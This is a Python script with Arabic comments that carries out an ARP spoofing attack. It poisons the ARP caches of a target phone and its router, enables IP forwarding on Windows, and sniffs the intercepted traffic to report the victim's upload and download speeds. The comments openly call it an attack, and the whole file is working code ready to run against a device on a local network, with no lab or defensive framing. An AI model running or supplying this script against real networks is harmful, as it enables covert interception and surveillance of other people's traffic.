# START: MODIFIED SECTION
import sys
import time
import os
import ctypes
import threading

# التحقق من المكتبات وتقديم رسائل خطأ واضحة
try:
    from scapy.all import ARP, Ether, sendp, sniff
    import psutil
except ImportError as e:
    print(f"[!] خطأ: هناك مكتبة ناقصة. ({e})")
    print("[!] يرجى التأكد من تشغيل الأوامر التالية في PowerShell كمسؤول:")
    print('[!] & "مسار_بايثون_الخاص_بك" -m pip install scapy psutil')
    sys.exit(1)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except AttributeError:
        return False

# --- قسم هجوم ARP Spoofing ---
def spoof_arp(target_ip, gateway_ip, stop_event):
    """
    هذه الدالة ستعمل في الخلفية بشكل مستمر لإبقاء الهجوم فعالاً.
    """
    print("[*] بدء عملية ARP Spoofing في الخلفية...")
    while not stop_event.is_set():
        # خداع الضحية
        sendp(Ether()/ARP(op=2, psrc=gateway_ip, pdst=target_ip), verbose=False)
        # خداع الراوتر
        sendp(Ether()/ARP(op=2, psrc=target_ip, pdst=gateway_ip), verbose=False)
        time.sleep(2)
    print("[*] تم إيقاف عملية ARP Spoofing.")

# --- قسم مراقبة وقياس البيانات ---
# متغيرات عالمية لتخزين الإحصائيات
stats = {}
last_update_time = time.time()

def process_packet(packet):
    """
    هذه هي الدالة الأهم. سيتم استدعاؤها لكل حزمة بيانات تمر عبر جهازنا.
    """
    global stats, last_update_time, TARGET_IP, GATEWAY_IP
    
    # التحقق مما إذا كانت الحزمة لها طبقة IP
    if 'IP' in packet:
        packet_size = len(packet)
        src_ip = packet['IP'].src
        dst_ip = packet['IP'].dst

        # حساب سرعة التحميل (Download) للهدف
        # (البيانات قادمة من الإنترنت/الراوتر وذاهبة إلى الهدف)
        if src_ip.startswith(GATEWAY_IP.rsplit('.', 1)[0]) and dst_ip == TARGET_IP:
            stats['download'] = stats.get('download', 0) + packet_size

        # حساب سرعة الرفع (Upload) للهدف
        # (البيانات قادمة من الهدف وذاهبة إلى الإنترنت/الراوتر)
        elif src_ip == TARGET_IP and dst_ip.startswith(GATEWAY_IP.rsplit('.', 1)[0]):
            stats['upload'] = stats.get('upload', 0) + packet_size

    # تحديث الشاشة كل ثانية
    current_time = time.time()
    if current_time - last_update_time > 1:
        download_speed = (stats.get('download', 0) * 8) / (1024 * 1024) # تحويل إلى ميجابت/ثانية
        upload_speed = (stats.get('upload', 0) * 8) / (1024 * 1024) # تحويل إلى ميجابت/ثانية
        
        # مسح الشاشة وطباعة الإحصائيات الجديدة
        os.system('cls' if os.name == 'nt' else 'clear')
        print("--- مراقبة استهلاك الشبكة (اضغط Ctrl+C للإيقاف) ---")
        print(f"الهدف: {TARGET_IP}")
        print(f"السرعة الحالية:")
        print(f"  - التحميل (Download): {download_speed:.2f} Mbps")
        print(f"  - الرفـــع (Upload)  : {upload_speed:.2f} Mbps")
        
        # إعادة تعيين العدادات للثانية التالية
        stats = {}
        last_update_time = current_time

# --- الإعدادات والتشغيل ---
if __name__ == "__main__":
    if not is_admin():
        print("[-] خطأ: يجب تشغيل هذا السكربت بصلاحيات المسؤول (Administrator).")
        sys.exit(1)
    
    # جعل السكربت يسأل عن العناوين بدلاً من كتابتها يدويًا
    TARGET_IP = input("[?] أدخل عنوان IP الخاص بالهدف (الهاتف): ")
    GATEWAY_IP = input("[?] أدخل عنوان IP الخاص بالراوتر (Gateway): ")

    # تفعيل إعادة توجيه الحزم في ويندوز (خطوة ضرورية جداً)
    print("[*] تفعيل إعادة توجيه IP... (هذا يضمن عدم انقطاع النت عن الهدف)")
    os.system("powershell -Command \"Set-NetIPInterface -Forwarding Enabled\" > NUL")

    # إنشاء وإدارة الخيوط (Threads)
    stop_event = threading.Event()
    spoof_thread = threading.Thread(target=spoof_arp, args=(TARGET_IP, GATEWAY_IP, stop_event))
    spoof_thread.start()

    print("[*] بدء عملية التنصت على الحزم...")
    try:
        # sniff هي دالة Scapy التي تستمع لحركة مرور الشبكة
        # prn=process_packet تعني أننا سنقوم باستدعاء دالتنا لكل حزمة
        # store=0 تعني عدم تخزين الحزم في الذاكرة لتوفير الرام
        sniff(filter="ip", prn=process_packet, store=0)
    except KeyboardInterrupt:
        print("\n[*] جاري إيقاف البرنامج وإصلاح الشبكة...")
        stop_event.set()
        spoof_thread.join() # انتظار انتهاء خيط الخداع
        # ملاحظة: في سيناريو حقيقي، يجب إعادة إرسال حزم تصحيحية.
        # حاليا، إيقاف الخداع سيؤدي إلى إصلاح الشبكة تلقائيًا بعد دقيقة.
    finally:
        print("[*] تم إيقاف البرنامج.")

